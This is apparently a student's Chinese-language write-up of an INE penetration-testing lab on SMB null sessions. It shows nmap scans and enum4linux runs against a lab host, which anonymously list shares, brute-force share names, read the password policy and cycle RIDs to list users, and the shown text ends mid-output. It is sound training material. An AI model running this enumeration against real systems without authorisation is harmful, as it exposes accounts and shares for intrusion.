---
layout: post
title: "Null Session Lab"
date: "2022-07-21"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Network Attacks
---

# Null Session
## 概述
在本实验中，您将在目标机器上可用的 samba 共享中查找空会话。

本练习将帮助您了解如何使用各种工具在旧环境中查找空会话并通过 SMB 访问文件。

## 任务
### 实验室环境
在这个实验室环境中，用户将获得对 Kali GUI 实例的访问权限。SMB 服务正在demo.ine.local上的目标机器上运行。

目标：扫描目标机器并找到 3 个标志：

* flag 1 存在于可公开访问的共享中名为flag_1的文件中。
* flag 2 存在于其中一个用户的不可浏览共享中名为flag_2的目录中。
* flag 3 存在于另一个不可浏览共享中名为flag_3的文件中。

### 指示
使用共享枚举词表： `/root/Desktop/wordlists/100-common-passwords.txt`

![demoinelocal.png](/img/in-post/ine/demoinelocal.png)

### 工具
本实验的最佳工具是： `- enum4linux - Nmap - nmblookup [optional] - smbclient - smbmap - Terminal`

## 我自己的解决思路
```
root@INE:~# ping demo.ine.local -c 4
PING demo.ine.local (192.44.238.3) 56(84) bytes of data.
64 bytes from demo.ine.local (192.44.238.3): icmp_seq=1 ttl=64 time=0.083 ms
64 bytes from demo.ine.local (192.44.238.3): icmp_seq=2 ttl=64 time=0.044 ms
64 bytes from demo.ine.local (192.44.238.3): icmp_seq=3 ttl=64 time=0.048 ms
64 bytes from demo.ine.local (192.44.238.3): icmp_seq=4 ttl=64 time=0.049 ms

--- demo.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3052ms
rtt min/avg/max/mdev = 0.044/0.056/0.083/0.015 ms
```

```
root@INE:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.7  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:07  txqueuelen 0  (Ethernet)
        RX packets 3809  bytes 326415 (318.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3071  bytes 2550550 (2.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.44.238.2  netmask 255.255.255.0  broadcast 192.44.238.255
        ether 02:42:c0:2c:ee:02  txqueuelen 0  (Ethernet)
        RX packets 54  bytes 6274 (6.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6  bytes 476 (476.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 16340  bytes 20195818 (19.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16340  bytes 20195818 (19.2 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

使用nmap扫描Windows打印机和文件共享使用的特定端口：

```
nmap -p 135,139,445 -sV demo.ine.local
```

```
root@INE:~# nmap -p 135,139,445 -sV demo.ine.local
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-20 14:21 IST
Nmap scan report for demo.ine.local (192.44.238.3)
Host is up (0.000042s latency).

PORT    STATE  SERVICE     VERSION
135/tcp closed msrpc
139/tcp open   netbios-ssn Samba smbd 4.6.2
445/tcp open   netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:C0:2C:EE:03 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds
```

参考：[使用 Enum4linux 和 Smbclient 枚举 SMB](https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/)

### enum4linux
```
root@INE:~# enum4linux
enum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/)
Copyright (C) 2011 Mark Lowe (mrl@portcullis-security.com)

Simple wrapper around the tools in the samba package to provide similar 
functionality to enum.exe (formerly from www.bindview.com).  Some additional 
features such as RID cycling have also been added for convenience.

Usage: ./enum4linux.pl [options] ip

Options are (like "enum"):
    -U        get userlist
    -M        get machine list*
    -S        get sharelist
    -P        get password policy information
    -G        get group and member list
    -d        be detailed, applies to -U and -S
    -u user   specify username to use (default "")  
    -p pass   specify password to use (default "")   

The following options from enum.exe aren't implemented: -L, -N, -D, -f

Additional options:
    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
              This opion is enabled if you don't provide any other options.
    -h        Display this help message and exit
    -r        enumerate users via RID cycling
    -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
    -K n      Keep searching RIDs until n consective RIDs don't correspond to
              a username.  Impies RID range ends at 999999. Useful 
              against DCs.
    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
    -s file   brute force guessing for share names
    -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
              Used to get sid with "lookupsid known_username"
              Use commas to try several users: "-k admin,user1,user2"
    -o        Get OS information
    -i        Get printer information
    -w wrkg   Specify workgroup manually (usually found automatically)
    -n        Do an nmblookup (similar to nbtstat)
    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)

RID cycling should extract a list of users from Windows (or Samba) hosts 
which have RestrictAnonymous set to 1 (Windows NT and 2000), or "Network 
access: Allow anonymous SID/Name translation" enabled (XP, 2003).

NB: Samba servers often seem to have RIDs in the range 3000-3050.

Dependancy info: You will need to have the samba package installed as this 
script is basically just a wrapper around rpcclient, net, nmblookup and 
smbclient.  Polenum from http://labs.portcullis.co.uk/application/polenum/ 
is required to get Password Policy info.
```

执行 nmblookup（类似于 nbtstat）：

```
enum4linux -n demo.ine.local
```

在结果中，我们看到了`20`标志，这意味着文件服务器服务是打开的，意味着用户有开放的共享。

```
root@INE:~# enum4linux -n demo.ine.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 20 14:32:20 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... demo.ine.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on demo.ine.local    |
 ====================================================== 
[+] Got domain/workgroup name: EVILCORP

 ============================================== 
|    Nbtstat Information for demo.ine.local    |
 ============================================== 
Looking up status of 192.44.238.3
        EVILCORP        <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        EVILCORP        <1e> - <GROUP> H <ACTIVE>  Browser Service Elections
        EVILCORP-SMB-SH <00> -         H <ACTIVE>  Workstation Service
        EVILCORP-SMB-SH <03> -         H <ACTIVE>  Messenger Service
        EVILCORP-SMB-SH <20> -         H <ACTIVE>  File Server Service

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on demo.ine.local    |
 ======================================= 
[+] Server demo.ine.local allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for demo.ine.local    |
 ============================================= 
Domain Name: EVILCORP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup
enum4linux complete on Wed Jul 20 14:32:21 2022
```

为了测试空会话，我们使用`-P`选项来尝试枚举远程系统上的密码策略。

```
enum4linux -P demo.ine.local
```

如果我们想在暴力破解工具上使用相同的信息，我们知道我们可以使用的参数。

远程系统最小密码长度是5，不使用密码复杂性策略。 并且重置账户锁定计数器为30分钟，锁定账户持续时间为30分钟。

```
root@INE:~# enum4linux -P demo.ine.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 20 14:42:36 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... demo.ine.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on demo.ine.local    |
 ====================================================== 
[+] Got domain/workgroup name: EVILCORP

 ======================================= 
|    Session Check on demo.ine.local    |
 ======================================= 
[+] Server demo.ine.local allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for demo.ine.local    |
 ============================================= 
Domain Name: EVILCORP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================================== 
|    Password Policy Information for demo.ine.local    |
 ====================================================== 


[+] Attaching to demo.ine.local using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] EVILCORP-SMB-SHARES
        [+] Builtin

[+] Password Info for Domain: EVILCORP-SMB-SHARES

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

enum4linux complete on Wed Jul 20 14:42:36 2022
```

`-S` 枚举远程机器上可用的共享。

```
enum4linux -S demo.ine.local
```

```
root@INE:~# enum4linux -S demo.ine.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 20 15:03:09 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... demo.ine.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on demo.ine.local    |
 ====================================================== 
[+] Got domain/workgroup name: EVILCORP

 ======================================= 
|    Session Check on demo.ine.local    |
 ======================================= 
[+] Server demo.ine.local allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for demo.ine.local    |
 ============================================= 
Domain Name: EVILCORP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =========================================== 
|    Share Enumeration on demo.ine.local    |
 =========================================== 
smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      This is a publically accessible share.
        ecorp           Disk      
        william         Disk      
        elliot          Disk      
        admin           Disk      
        share$          Disk      
        IPC$            IPC       IPC Service (evilcorp.smb.shares)
Reconnecting with SMB1 for workgroup listing.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on demo.ine.local
//demo.ine.local/public Mapping: OK, Listing: OK
//demo.ine.local/ecorp  Mapping: DENIED, Listing: N/A
//demo.ine.local/william        Mapping: DENIED, Listing: N/A
//demo.ine.local/elliot Mapping: DENIED, Listing: N/A
//demo.ine.local/admin  Mapping: DENIED, Listing: N/A
//demo.ine.local/share$ Mapping: DENIED, Listing: N/A
//demo.ine.local/IPC$   [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
enum4linux complete on Wed Jul 20 15:03:10 2022
```

使用共享枚举单词列表：`/root/Desktop/wordlists/100-common-passwords.txt`：

如果由于某种原因您没有从 Enum 获得足够的信息，它可以使用暴力文件尝试枚举远程计算机上可用的任何共享。 这些名称通常包含一些用户名和密码组合。 我们通过使用 `-s` 命令和蛮力列表的路径来使用它。

```
enum4linux -s /root/Desktop/wordlists/100-common-passwords.txt demo.ine.local
```

```
root@INE:~# enum4linux -s /root/Desktop/wordlists/100-common-passwords.txt demo.ine.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 20 17:20:51 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... demo.ine.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on demo.ine.local    |
 ====================================================== 
[+] Got domain/workgroup name: EVILCORP

 ======================================= 
|    Session Check on demo.ine.local    |
 ======================================= 
[+] Server demo.ine.local allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for demo.ine.local    |
 ============================================= 
Domain Name: EVILCORP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================================= 
|    Brute Force Share Enumeration on demo.ine.local    |
 ======================================================= 
shadow1 EXISTS, Allows access using username: '', password: ''
ERROR: Share name iloveyou! contains some illegal characters
```

发现了共享`shadow1`，允许使用空用户名和密码访问。

Enum 还可以使用 `-a` 在单个提示符中运行所有可用命令。

```
enum4linux -a demo.ine.local
```

```
root@INE:~# enum4linux -a demo.ine.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jul 20 15:27:20 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... demo.ine.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on demo.ine.local    |
 ====================================================== 
[+] Got domain/workgroup name: EVILCORP

 ============================================== 
|    Nbtstat Information for demo.ine.local    |
 ============================================== 
Looking up status of 192.44.238.3
        EVILCORP        <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        EVILCORP        <1e> - <GROUP> H <ACTIVE>  Browser Service Elections
        EVILCORP-SMB-SH <00> -         H <ACTIVE>  Workstation Service
        EVILCORP-SMB-SH <03> -         H <ACTIVE>  Messenger Service
        EVILCORP-SMB-SH <20> -         H <ACTIVE>  File Server Service

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on demo.ine.local    |
 ======================================= 
[+] Server demo.ine.local allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for demo.ine.local    |
 ============================================= 
Domain Name: EVILCORP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on demo.ine.local    |
 ======================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for demo.ine.local from smbclient: 
[+] Got OS info for demo.ine.local from srvinfo:
        EVILCORP-SMB-SHWk Sv PrQ Unx NT SNT evilcorp.smb.shares
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 =============================== 
|    Users on demo.ine.local    |
 =============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: ecorp    Name:   Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: william  Name:   Desc: 
index: 0x3 RID: 0x3ec acb: 0x00000010 Account: raymond  Name:   Desc: 
index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: michael  Name:   Desc: 
index: 0x5 RID: 0x3eb acb: 0x00000010 Account: elliot   Name:   Desc: 
index: 0x6 RID: 0x3ed acb: 0x00000010 Account: admin    Name:   Desc: 

user:[ecorp] rid:[0x3e8]
user:[william] rid:[0x3ea]
user:[raymond] rid:[0x3ec]
user:[michael] rid:[0x3e9]
user:[elliot] rid:[0x3eb]
user:[admin] rid:[0x3ed]

 =========================================== 
|    Share Enumeration on demo.ine.local    |
 =========================================== 
smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      This is a publically accessible share.
        ecorp           Disk      
        william         Disk      
        elliot          Disk      
        admin           Disk      
        share$          Disk      
        IPC$            IPC       IPC Service (evilcorp.smb.shares)
Reconnecting with SMB1 for workgroup listing.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on demo.ine.local
//demo.ine.local/public Mapping: OK, Listing: OK
//demo.ine.local/ecorp  Mapping: DENIED, Listing: N/A
//demo.ine.local/william        Mapping: DENIED, Listing: N/A
//demo.ine.local/elliot Mapping: DENIED, Listing: N/A
//demo.ine.local/admin  Mapping: DENIED, Listing: N/A
//demo.ine.local/share$ Mapping: DENIED, Listing: N/A
//demo.ine.local/IPC$   [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ====================================================== 
|    Password Policy Information for demo.ine.local    |
 ====================================================== 


[+] Attaching to demo.ine.local using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] EVILCORP-SMB-SHARES
        [+] Builtin

[+] Password Info for Domain: EVILCORP-SMB-SHARES

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ================================ 
|    Groups on demo.ine.local    |
 ================================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:
group:[Reserved] rid:[0x3f1]

[+] Getting local group memberships:

[+] Getting domain groups:
group:[Developer] rid:[0x3ee]
group:[Guest] rid:[0x3ef]
group:[Maintainer] rid:[0x3f0]
group:[Tester] rid:[0x3f2]
group:[Admin] rid:[0x3f3]

[+] Getting domain group memberships:
Group 'Developer' (RID: 1006) has member: EVILCORP-SMB-SHARES\admin
Group 'Developer' (RID: 1006) has member: EVILCORP-SMB-SHARES\elliot
Group 'Guest' (RID: 1007) has member: EVILCORP-SMB-SHARES\admin
Group 'Guest' (RID: 1007) has member: EVILCORP-SMB-SHARES\raymond
Group 'Maintainer' (RID: 1008) has member: EVILCORP-SMB-SHARES\admin
Group 'Maintainer' (RID: 1008) has member: EVILCORP-SMB-SHARES\michael
Group 'Maintainer' (RID: 1008) has member: EVILCORP-SMB-SHARES\elliot
Group 'Tester' (RID: 1010) has member: EVILCORP-SMB-SHARES\admin
Group 'Tester' (RID: 1010) has member: EVILCORP-SMB-SHARES\william

 ========================================================================= 
|    Users on demo.ine.local via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[I] Found new SID: S-1-5-21-1554144052-2760123283-2295077451
[I] Found new SID: S-1-22-2
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\ecorp (Local User)
S-1-22-1-1001 Unix User\michael (Local User)
S-1-22-1-1002 Unix User\william (Local User)
S-1-22-1-1003 Unix User\elliot (Local User)
S-1-22-1-1004 Unix User\raymond (Local User)
S-1-22-1-1005 Unix User\admin (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-2 and logon username '', password ''
S-1-22-2-1000 Unix Group\admins (Domain Group)
S-1-22-2-1001 Unix Group\Developer (Domain Group)
S-1-22-2-1002 Unix Group\Guest (Domain Group)
S-1-22-2-1003 Unix Group\Maintainer (Domain Group)
S-1-22-2-1004 Unix Group\Reserved (Domain Group)
S-1-22-2-1005 Unix Group\Tester (Domain Group)
[+] Enumerating users using SID S-1-5-21-1554144052-2760123283-2295077451 and logon username '', password ''
S-1-5-21-1554144052-2760123283-2295077451-500 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-501 EVILCORP-SMB-SHARES\nobody (Local User)
S-1-5-21-1554144052-2760123283-2295077451-502 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-503 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-504 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-505 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-506 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-507 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-508 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-509 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-510 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-511 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-512 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-513 EVILCORP-SMB-SHARES\None (Domain Group)
S-1-5-21-1554144052-2760123283-2295077451-514 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-515 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-516 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-517 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-518 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-519 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-520 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-521 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-522 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-523 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-524 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-525 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-526 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-527 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-528 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-529 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-530 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-531 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-532 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-533 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-534 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-535 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-536 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-537 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-538 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-539 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-540 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-541 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-542 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-543 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-544 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-545 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-546 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-547 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-548 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-549 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-550 *unknown*\*unknown* (8)
S-1-5-21-1554144052-2760123283-2295077451-1000 EVILCORP-SMB-SHARES\ecorp (Local User)
S-1-5-21-1554144052-2760123283-2295077451-1001 EVILCORP-SMB-SHARES\michael (Local User)
S-1-5-21-1554144052-2760123283-2295077451-1002 EVILCORP-SMB-SHARES\william (Local User)
S-1-5-21-1554144052-2760123283-2295077451-1003 EVILCORP-SMB-SHARES\elliot (Local User)
S-1-5-21-1554144052-2760123283-2295077451-1004 EVILCORP-SMB-SHARES\raymond (Local User)
S-1-5-21-1554144052-2760123283-2295077451-1005 EVILCORP-SMB-SHARES\admin (Local User)
S-1-5-21-1554144052-2760123283-2295077451-1006 EVILCORP-SMB-SHARES\Developer (Domain Group)
S-1-5-21-1554144052-2760123283-2295077451-1007 EVILCORP-SMB-SHARES\Guest (Domain Group)
S-1-5-21-1554144052-2760123283-2295077451-1008 EVILCORP-SMB-SHARES\Maintainer (Domain Group)
